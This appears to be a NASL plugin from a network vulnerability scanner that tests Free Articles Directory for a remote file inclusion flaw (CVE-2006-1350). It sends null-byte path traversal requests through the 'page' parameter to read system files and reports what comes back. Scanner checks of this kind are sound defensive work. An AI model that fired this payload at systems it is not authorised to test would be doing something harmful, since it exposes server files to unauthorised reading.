if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80060" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-1350" );
	script_bugtraq_id( 17183 );
	script_xref( name: "OSVDB", value: "24024" );
	script_name( "Free Articles Directory Remote File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2008 Josh Zlatin-Amishav" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The remote web server contains a PHP application that is affected by a
  remote file include vulnerability.

  Description :

  The remote host is running Free Articles Directory, a CMS written in
  PHP.

  The installed version of Free Articles Directory fails to sanitize
  user input to the 'page' parameter in index.php.  An unauthenticated
  attacker may be able to read arbitrary local files or include a file
  from a remote host that contains commands which will be executed by
  the vulnerable script, subject to the privileges of the web server
  process." );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2006-03/0396.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/99articles", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		for pattern in keys( files ) {
			file = files[pattern];
			url = NASLString( dir, "/index.php?page=/" + file + "%00" );
			req = http_get( item: url, port: port );
			res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
			if(res == NULL){
				continue;
			}
			if(( ContainsString( res, "Website Powered by <strong><a href=\"http://www.ArticlesOne.com\">ArticlesOne.com" ) && egrep( pattern: pattern, string: res ) ) || egrep( string: res, pattern: "Warning.+/" + file + ".+failed to open stream" ) || egrep( string: res, pattern: "Warning.+ Failed opening '/" + file + ".+for inclusion" )){
				if(egrep( pattern: pattern, string: res )){
					content = strstr( res, "<input type=image name=subscribe" );
					if(content){
						content = strstr( content, "style=\"padding-left:10\">" );
					}
					if(content){
						content = content - "style=\"padding-left:10\">";
					}
					if(content){
						content = content - strstr( content, "</td>" );
					}
				}
				if( content ) {
					report = NASLString( "Here are the contents of the file '/" + file + "' that\\n", "It was possible to read from the remote host :\\n", "\\n", content );
				}
				else {
					report = "";
				}
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

